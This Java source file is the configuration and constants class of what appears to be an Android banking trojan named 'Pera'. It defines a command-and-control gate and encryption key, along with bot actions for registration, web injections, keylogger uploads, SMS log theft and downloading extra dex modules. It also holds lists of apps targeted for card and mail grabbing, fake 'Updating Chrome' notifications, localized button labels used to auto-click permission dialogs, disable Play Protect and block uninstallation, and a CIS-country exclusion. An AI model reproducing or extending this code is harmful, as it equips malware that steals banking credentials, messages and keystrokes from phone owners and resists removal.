package com.service.app;

import android.os.Build;
import android.util.Base64;

import com.service.app.Main.ClassRC4;
import com.service.app.Services.Netmanager;
import com.service.app.Services.SensorService;
import com.service.app.Services.kingservice;
import com.service.app.vnc.WebSocketService;

import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.Map;

public class defines {
    public String decrypt_str(String textDE_C){
        try {
            return new String(new ClassRC4(textDE_C.substring(0,12).getBytes()).decrypt(hexStringToByteArray(new String(Base64.decode(textDE_C.substring(12), Base64.DEFAULT), StandardCharsets.UTF_8))));
        }catch (Exception ex){ }
        return "";
    }
    public   byte[] hexStringToByteArray(String s){
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }

    public String base64Decode(String str){
        try{
            byte[] data = Base64.decode(str, Base64.DEFAULT);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                return new String(data, StandardCharsets.UTF_8);
            } return "";
        }catch (Exception ex){return "";}
    }

    public  boolean DebugConsole = true;

    public  String idbot = "idbot";
    public  String initialization = "initialization";
    public  String urlAdminPanel = "urlAdminPanel";
    public  String starterService = "starterService";
    public  String statusInstall = "statusInstall";
    public  String kill = "kill";
    public  String killApplication = "killApplication";
    public  String step = "step";
    public  String activityAccessibilityVisible = "activityAccessibilityVisible";
    public  String arrayInjection = "arrayInjection";
    public  String checkupdateInjection = "checkupdateInjection";
    public  String whileStartUpdateInection = "whileStartUpdateInection";
    public  String actionSettingInection = "actionSettingInection";
    public  String listSaveLogsInjection = "listSaveLogsInjection";
    public  String LogSMS = "LogSMS";
    public  String packageNameDefultSmsMenager = "packageNameDefultSmsMenager";
    public  String hiddenSMS = "hiddenSMS";
    public  String idSettings = "idSettings";
    public  String statAdmin = "statAdmin";
    public  String statProtect = "statProtect";
    public  String statScreen = "statScreen";
    public  String statAccessibilty = "statAccessibilty";
    public  String statSMS = "statSMS";
    public  String statCards = "statCards";
    public  String statBanks = "statBanks";
    public  String statMails = "statMails";
    public  String activeDevice = "activeDevice";
    public  String timeWorking = "timeWorking";
    public  String statDownloadModule = "statDownloadModule";
    public  String lockDevice = "lockDevice";
    public  String offSound = "offSound";
    public  String keylogger = "keylogger";
    public  String activeInjection = "activeInjection";
    public  String timeInject = "timeInject";
    public  String timeCC = "timeCC";
    public  String timeMails = "timeMails";
    public  String dataKeylogger = "dataKeylogger";
    public  String autoClick = "autoClick";
    public  String traf_key = "key";
    public  String display_width = "display_width";
    public  String display_height = "display_height";
    public  String checkProtect = "checkProtect";
    public  String goOffProtect = "goOffProtect";
    public  String timeProtect = "timeProtect";
    public  String packageName = "packageName";
    public  String packageNameActivityInject = "packageNameActivityInject";
    public  String logsContacts = "logsContacts";
    public  String logsApplications = "logsApplications";
    public  String logsSavedSMS = "logsSavedSMS";
    public  String locale = "locale";
    public  String batteryLevel = "batteryLevel";
    public  String urls = "urls";
    public  String getPermissionsToSMS = "getPermissionsToSMS";
    public  String startInstalledTeamViewer = "startInstalledTeamViewer";
    public  String day1PermissionSMS = "day1PermissionSMS";
    public  String schetBootReceiver = "schetBootReceiver";
    public  String schetAdmin = "schetAdmin";
    public  String start_admin = "start_admin";
    //------------Constants replace java class------

    public  String str_keyguard = "keyguard"; //idUtils, Utils

    public  boolean blockCIS = true;
    public  String nameFileSettings = "settings";
    public  String tag = "Pera";
    public  String str_urlAdminPanel = "127.0.0.1/gate.php";
    public  String ws_url = "127.0.0.1";
    public  Boolean FakeAPP = false;
    public  Boolean ssl = false;
    public  String key = "pera123";
    public  int startStep = 0;

    // Auto perms

    public boolean unknown_sources = false;
    public boolean draw_over_apps = false;

    public boolean write_perm = false;

    public String vnc_notify_title = "Updating";
    public String vnc_notify_text = "please wait";

    public final static Map<String, Object> antisleepPush = Map.ofEntries(
            Map.entry("title","Updating Chrome"),
            Map.entry("text", "Updating..."),
            Map.entry("ticker", "Nature"),
            Map.entry("sleep_task", "sleep_task")
    );

    public String hint_notify_title = "Please ENABLE!";
    public String hint_notify_text = "Please ENABLE!";
    public Integer hint_reoccure_delay = 20000; // 20 secs

    public Integer undeadPushTime = 1000 * 60 * 60;

    public String szPermis = "[az]İzin ver::[sq]Të lejojë::[am]የሚሰጡዋቸውን::[en]Allow::[ar]تسمح::[hy]Լուծել::[af]Laat::[eu]Baimendu::[ba]Рөхсәт::[be]Дазволіць::[bn]অনুমতি::[my]ခွင့်ပြု::[bg]Оставя се::[bs]Dozvoliti::[cy]Caniatáu::[hu]Lehetővé teszi,::[vi]Cho phép::[ht]Pèmèt::[gl]Permitir::[nl]Toestaan::[mrj]Разрешӓйӹ::[el]Επιτρέπεται::[ka]საშუალებას::[gu]પરવાનગી આપે છે::[da]Tillad::[he]לאפשר::[yi]לאָזן::[id]Memungkinkan::[ga]Cheadú::[is]Leyfa::[es]Permitir::[it]Consentire::[kk]Рұқсат етілсін::[kn]ಅವಕಾಶ::[ca]Permetre::[ky]Уруксат::[zh]允许::[ko]용::[xh]Vumela::[km]អនុញ្ញាត::[lo]ອະນຸຍາດ::[la]Sino::[lv]Atļaut::[lt]Leisti::[lb]Zulassen::[mk]Дозволете::[mg]Mamela::[ms]Membenarkan::[ml]അനുവദിക്കുക::[mt]Tippermetti::[mi]Tukua::[mr]परवानगी::[mhr]Кӧнеда::[mn]Зөвшөөрөх::[de]Zulassen::[ne]अनुमति::[no]La::[pa]ਸਹਾਇਕ ਹੈ::[pap]Permití::[fa]اجازه می دهد::[pl]Pozwól::[pt]Permitir::[ro]Permite::[ru]Разрешить::[ceb]Pagtugot::[sr]Дозволи::[si]ඉඩ::[sk]Povoliť::[sl]Dovolite,::[sw]Kuruhusu::[su]Ngidinan::[tl]Payagan ang mga::[tg]Иҷозат::[th]อนุญาต::[ta]அனுமதிக்க::[tt]Игъланнары::[te]అనుమతిస్తుంది.::[tr]İzin ver::[udm]Разрешить::[uz]Ruxsat::[uk]Дозволити::[ur]کی اجازت::[fi]Salli::[fr]Autoriser::[hi]की अनुमति::[hr]Dopusti::[cs]Povolit::[sv]Tillåta::[gd]Ceadaich::[eo]Permesi::[et]Luba::[jv]Ngidini::[ja]許可";


    public  String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    public  String strREAD_PHONE_STATE = "android.permission.READ_PHONE_STATE";
    public  String[] arrayPermission = {"android.permission.SEND_SMS","android.permission.READ_PHONE_STATE","android.permission.READ_CONTACTS"};
    public  String str_timesp = "timestop";
    public  String strPackage = "package:";
    public  String strTAG1 = " >> ";
    public  String strUTF_8 = "UTF-8";
    public  String str_POST = "POST";
    public  String str_Content_Length = "Content-Length";
    public  String str_good = "good";
    public  String str_step= "0";
    public  String str_null = "";
    public  String str = " ";
    public  String str_1 = "1";
    public  String str_gate = "/gate.php";
    public  String str_qwergasdzxc = "qwertyuiopasdfghjklzxcvbnm1234567890";
    public  String str_dead = "dead";
    public  String str_log1 = "START >> Boot Receiver";
    public  String str_step2= "step";
    public  String str_log2 = "No Doze Mode";
    public  String str_log15 = "-------------------checkAdminPanel-------------------";
    public  String str_http_1 = "action=getinj&data=";
    public  String str_http_2 = "action=injcheck&data=";
    public  String str_http_3 = "action=botcheck&data=";
    public  String str_http_11 = "||no||";
    public  String str_http_12 = "action=registration&data=";
    public  String str_http_16 = "action=sendInjectLogs&data=";
    public  String str_http_17 = "action=sendSmsLogs&data=";
    public  String str_http_18 = "action=timeInject&data=";
    public  String str_http_19 = "action=sendKeylogger&data=";
    public  String str_http_20 = "action=getModule&data=";
    public  String str_http_21 = "action=checkAP&data=";
    public  String str_log16= "Not Yet Implemented";
    public  String nameModule = "system.apk";
    public  String string_1 = "Android";
    public  String string_2 = "text/html";

    public  String string_4 = "Tooltip: You need enable Accessibility";
    public  String string_5 = "'";
    public  String string_6 = "app";
    public  String string_7 = "name";
    public  String string_8 = "grabCC";
    public  String string_9 = "grabMails";
    public  String string_10 = "var lang = 'en'";
    public  String string_11 = "var lang = '";
    public  String string_12 = "app = 'THISSTRINGREPLACEWITHAPPNAME'";
    public  String string_13 = "app = '";
    public  String string_14 = "'";
    public  String string_15 = "Start View Injection: ";
    public  String string_16 = "ERROR View Injection: ";
    public  String string_17 = "-";
    public  String string_18 = "application";
    public  String string_19 = "data";
    public  String string_20 = base64Decode("LCJleGl0IjoiIg==");
    public  String string_20_ = base64Decode("LCJleGl0IjoidHJ1ZSI=");
    public  String string_21 = "ID: ";
    public  String string_22 = " Logs: ";
    public  String string_23 = ":";
    public  String string_24 = "admin";
    public  String string_25 = "START SERVICE 1: ";
    public  String string_26 = "START SERVICE 2: ";
    public  String string_27_ = "WORKING SERVICE: ";
    public  String string_27 = "Error #1 onAccessibilityEvent";
    public  String string_28 = "click unlock device";
    public  String string_29 = "nodeInfo == null";
    public  String string_30 = "CLICKED: ";
    public  String string_31 = "   X:";
    public  String string_32 = "   Y:";
    public  String string_33 = "packageApp{";
    public  String string_34 = "} strText{";
    public  String string_35 = "} className{";
    public  String string_36 = "}";
    public  String string_37 = "com.android.settings.SubSettings";
    public  String string_38 = "Log Keylogger Size: ";
    public  String string_39 = "com.android.settings:id/action_button";
    public  String string_40 = "android:id/button1";
    public  String string_41 = "com.android.packageinstaller:id/permission_allow_button";
    public  String string_42 = "-=CLICK BUTTON=-";
    public  String string_43 = "com.android.settings:id/action_button";
    public  String string_44 = "com.android.settings:id/left_button";
    public  String string_45 = "com.google.android.packageinstaller";
    public  String string_46 = "android.app.alertdialog";
    public  String string_47 = "android.support.v7.widget.recyclerview";
    public  String string_48 = "android.widget.linearlayout";
    public  String string_48_ = "com.miui.securitycenter";
    public  String string_49 = "com.android.settings";
    public  String string_49_ = "com.miui.securitycenter:id/accept";
    public  String string_50 = "com.android.settings.deviceadminadd";
    public  String string_51 = "ERROR BLOCK";
    public  String string_52 = "MM/dd/yyyy, HH:mm:ss z";
    public  String string_53 = "[Focused]";
    public  String string_54 = "[Click]";
    public  String string_55 = "[Wtore Text]";
    public  String string_56 = ":endlog:";
    public  String string_57 = "params";
    public  String string_58 = "packageAppStart";
    public  String string_59 = "nameInject";
    public  String string_60 = "packageProject";
    public  String string_61 = "packageView";
    public  String string_62 = "startViewInject";
    public  String string_63 = "ERROR Start Injection: ";
    public  String string_64 = " ";
    public  String string_65 = "onInterrupt";
    public  String string_66 = "com.android.vending";
    public  String string_67 = "com.android.vending:id/play_protect_settings";
    public  String string_67_new2 = "com.android.vending:id/toolbar_item_play_protect_settings";
    public  String string_68 = "com.google.android.gms.security.settings.verifyappssettingsactivity";
    public  String string_69 = "android.app.alertdialog";
    public  String string_70 = "onServiceConnected";
    public  String string_71 = "id";
    public  String string_72 = "number";
    public  String string_73 = "ERROR JSON CHECK BOT";
    public  String string_74 = "jsonCheckBot: ";
    public  String string_75 = ",";
    public  String string_76 = "Check URL: ";
    public  String string_77 = "~I~";
    public  String string_78 = "NEW DOMAIN: ";
    public  String string_79 = "ERROR Check URLS";
    public  String string_80 = "EnCryptResponce: ";
    public  String string_81 = "CheckBotRESPONCE: ";
    public  String string_82 = "||youNeedMoreResources||";
    public  String string_83 = "android";
    public  String string_84 = "tag";
    public  String string_85 = "country";
    public  String string_86 = "operator";
    public  String string_87= "model";
    public  String string_88 = "jsonRegistrationBot: ";
    public  String string_89 = "RegistrationRESPONCE: ";
    public  String string_90 = "ok";
    public  String string_91 = "params";
    public String undead = "undead";
    public  String string_92 = "updateSettingsAndCommands";
    public  String string_93 = "response";
    public  String string_94 = "Tick: ";
    public  String string_95 = "apk";
    public  String string_96 = "serviceWorkingWhile";
    public  String string_97 = "tick";
    public  String string_98 = "accessibility";
    public  String string_99 = "ERROR: module Dex Start";
    public  String string_100 = "-1";
    public  String string_101 = "2";
    public  String string_102 = "downloadModuleDex";
    public  String string_103 = "Download Module: ";
    public  String string_104 = "Save Module";
    public  String string_105 = "ERROR: Work File Module";
    public  String string_106 = "outdex";
    public  String string_107 = "com.service.modulebot.mod";
    public  String string_108 = "main";
    public  String string_109 = "DexClassLoader";
    public  String string_110 = "Error: ";
    public  String string_111 = "getNameApplication";
    public  String string_112 = "Error Method";
    public  String string_113 = "LockDevice";
    public  String string_114 = "ERROR";
    public  String string_115 = "inject";
    public  String string_116 = "pdus";
    public  String string_117 = "Input SMS: ";
    public  String string_118 = " Text:";
    public  String string_119 = "::endLog::";
    public  String string_120 = "sendSMS";
    public  String string_121 = "idinject";
    public  String string_122 = "application";
    public  String string_123 = "logs";
    public  String string_124 = "SEND";
    public  String string_125 = "idinject: ";
    public  String string_126 = "idbot: ";
    public  String string_127 = "application: ";
    public  String string_128 = "logs: ";
    public  String string_129 = "date";
    public  String string_130 = "SEND SMS";
    public  String string_131 = "str_getParams";
    public  String string_132 = "str_params";
    public  String string_133 = "mergedJSON";
    public  String string_134 = "JSON";
    public  String string_135 = "ERROR SettingsToAddJson";
    public  String string_136 = "Initialization Start 1!";
    public  String string_137 = "Initialization Start 2!";
    public  String string_138 = "startpush";
    public  String string_139 = "push";
    public  String string_142 = base64Decode("PGh0bWwgbGFuZz0iZW4iPg==");
    public  String string_143 = base64Decode("PGh0bWwgbGFuZz0i");
    public  String string_144 = base64Decode("Ij4=");
    public  String string_146 = "Inject:";
    public  String string_157 = " # ";
    public  String string_164 = "BLOCK DISABLE ACCESIBILITY SERVICE";
    public  String string_167 = "BLOCK DELETE";
    public  String string_168 = "BLOCK DISABLE ADMIN";
    public  String string_170 = ".";
    public  String string_178 = "~no~";
    public  String listAppGrabCards = "com.android.vending,org.telegram.messenger,com.ubercab,com.whatsapp,com.tencent.mm,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android,";
    public  String listAppGrabMails = "com.google.android.gm,com.mail.mobile.android.mail,com.connectivityapps.hotmail,com.microsoft.office.outlook,com.yahoo.mobile.client.android.mail,";
    public  String localeForAccessibilityEN = "Enable";

    public String userPresent = "userPresent";
    public String endlessServiceStatus = "endlessServiceStatus";
    public String timesAdminPerm = "timesAdminPerm";
    public String timeSinceKnock = "timeSinceKnock";

    // antidel

    public static final List<String> adminLabelList = Arrays.asList(
            "Admin",
            "Administrator"
    );
    public static final List<String> uninstallButtonsLabelList = Arrays.asList(
            "Uninstall",
            "Деинсталляция",
            "Удаление",
            "Деинсталиране",
            "Odinstalovat",
            "Fjern",
            "Verwijderen",
            "Desinstallimine",
            "Poista",
            "Désinstaller",
            "Deinstallieren",
            "Κατάργηση",
            "Eltávolítás",
            "Disinstalla",
            "Atinstalēt",
            "Pašalinti",
            "Iddiżinstalla",
            "Odinstaluj",
            "Desinstalar",
            "Dezinstalare",
            "Odinštalovať",
            "Odstranitev",
            "Avinstallera"
    );

    public static final List<String> accessibilityLabelList = Arrays.asList(
            "Accessibility",
            "Acessibilidade",
            "Accesibilidad"
    );

    public static final List<String> accessibilityShortcutList = Arrays.asList(
            "Shortcut",
            "Atajo",
            "Atalho"
    );

    public static final List<String> pauseLabelList = Collections.singletonList(
            "Pause"
    );

    public static final List<String> forcestopList = Arrays.asList(
            "Force stop",
            "Disable"
    );

    public static final List<String> pauseLabelList2 = Collections.singletonList(
            "Pause"
    );

    public static final List<String> appInfoWindowHashList = Arrays.asList(
            "4e7d36521f246327efffde4e5f3d1705bacff85a7d3cf1836d31714196434d79",
            "f82847a89d3e776505ab6af6cf2d0298455b52f9e9741cd0d9d3714451a96aff",
            "d83fa5b262824b544ed5565164a1791e29d015bdd325461ed9344a9a5b60c9b5",
            "34a6a777402003a51fa70f4184ec8340c4dda695849309bbf5647648b2c3c62d"
    );

    public static final List<String> resetButtonsLabelList  = Arrays.asList(
            "Reset",
            "Erase all",
            "Factory reset"
    );

    public  String[] localeForResetOptions = {
            "Zurücksetzen",    // German
            "restablecimiento", // Spanish
            "réinitialisation",  // French
            "Reset",                // English
            "reimpostazione",        // Italian
            "Redefinir",        // Portuguese
            "Сброс",             // Russian
            "リセット",               // Japanese
            "重置选项",                      // Chinese (Simplified)
            "重設選項",                      // Chinese (Traditional)
            "재설정",                    // Korean
            "خيارات إعادة الضبط",            // Arabic
            "रीसेट विकल्प",                 // Hindi
            "রিসেট অপশন",                  // Bengali
            "resetten",                  // Dutch
            "Nulstil",           // Danish
            "Tilbakestill alternativer",    // Norwegian
            "Återställningsalternativ",     // Swedish
            "Palautusvalinnat",            // Finnish
            "Endurstillingar",              // Icelandic
            "Opcje resetowania",            // Polish
            "Možnosti obnovení",            // Czech
            "Možnosti obnovenia",           // Slovak
            "Visszaállítási lehetőségek",    // Hungarian
            "Opțiuni de resetare",          // Romanian
            "Опции за нулиране",            // Bulgarian
            "Επιλογές επαναφοράς",          // Greek
            "Sıfırlama seçenekleri",         // Turkish
            "Скинути",                      // Ukrainian
            "Опције ресетовања",            // Serbian
            "Opcije resetiranja",           // Croatian
            "Možnosti ponastavitve",        // Slovenian
            "Atstatymo parinktys",          // Lithuanian
            "Atiestatīšanas iespējas",      // Latvian
            "Lähtestamise valikud",         // Estonian
            "Resetopties",                  // Dutch (Belgium)
            "Opcions de restabliment",      // Catalan
            "Opcje resetowania"             // Basque
    };
    public  String localeForAccessibility =
            "{"+
                    "'en':'Enable'," +
                    "'de':'Aktivieren'," +
                    "'af':'Aktiveer'," +
                    "'zh':'启用'," +
                    "'cs':'Zapnout'," +
                    "'nl':'Activeren'," +
                    "'fr':'Activer'," +
                    "'it':'Abilitare'," +
                    "'ja':'有効にする'," +
                    "'ko':'사용하다'," +
                    "'pl':'włączyć'," +
                    "'es':'Habilitar'," +
                    "'ar':'يُمكّن'," +
                    "'bg':'Възможност'," +
                    "'ca':'Habilitar'," +
                    "'hr':'Aktivirati'," +
                    "'da':'Aktivere'," +
                    "'fi':'Ottaa käyttöön'," +
                    "'el':'ενεργοποιώ'," +
                    "'iw':'הפוך לזמין'," +
                    "'hi':'सक्षम करें'," +
                    "'hu':'Engedélyez'," +
                    "'in':'Fungsikan'," +
                    "'lv':'Aktivizēt'," +
                    "'lt':'Aktyvinti'," +
                    "'nb':'Aktivere'," +
                    "'pt':'Ativar'," +
                    "'ro':'Activa'," +
                    "'sr':'Aktivirati'," +
                    "'sk':'Aktivovať'," +
                    "'sl':'Vključiti'," +
                    "'sv':'Aktivera'," +
                    "'th':'เปิดใช้งาน'," +
                    "'tr':'Lütfen etkinleştir'," +
                    "'vi':'có hiệu lực'" +
                    "}";
    public  String strCIS = "[ru][by][tj][uz][tm][az][am][kz][kg][md]";
    public  Class[] arrayClassService = {SensorService.class, kingservice.class, WebSocketService.class, Netmanager.class};
}

